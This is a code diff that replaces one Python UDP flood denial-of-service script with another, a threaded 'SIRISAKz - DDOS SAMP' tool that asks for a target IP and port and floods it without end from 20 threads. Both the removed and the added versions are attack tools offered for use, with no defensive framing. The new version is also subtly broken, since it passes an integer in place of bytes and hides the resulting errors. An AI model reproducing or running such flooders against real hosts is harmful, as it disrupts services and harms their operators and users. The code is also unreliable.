@@ -1,24 +1,36 @@
-#!/usr/bin/python
-import socket,random,sys,time
- 
-if len(sys.argv)==1:
-    sys.exit('Usage: f.py ip port(0=random) length(0=forever)')
- 
-def UDPFlood():
-    port = int(sys.argv[2])
-    randport=(True,False)[port==0]
-    ip = sys.argv[1]
-    dur = int(sys.argv[3])
-    clock=(lambda:0,time.clock)[dur>0]
-    duration=(1,(clock()+dur))[dur>0]
-    print('Jebanje majke: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
-    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    bytes=random._urandom(15000)
-    while True:
-        port=(random.randint(1,15000000),port)[randport]
-        if clock()<duration:
-            sock.sendto(bytes,(ip,port))
-        else:
-            break
-    print('DONE')
-UDPFlood()
+import random
+import socket
+import threading
+
+print("")
+print("")
+print(""" 
+	| SIRISAKz - DDOS SAMP | 
+""")
+print("")
+print("""
+	  - UDP FLOOD ATTACK -
+""")
+print("")
+print("")
+ip = input(" IP : ")
+port = input(" PORT : ")
+
+def udpsirisakz():
+	data = 65000
+	thr = int(0)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			s.sendto(data,addr)
+			for x in range(1):
+				s.sendto(data,addr)
+				thr += 1
+			print(f"| SIRISAKz UDP - ATTACK | {ip}:{port} Time: 120 >>", thr)
+		except:
+			thr -= 1
+
+for y in range(20):
+		th = threading.Thread(target = udpsirisakz)
+		th.start()
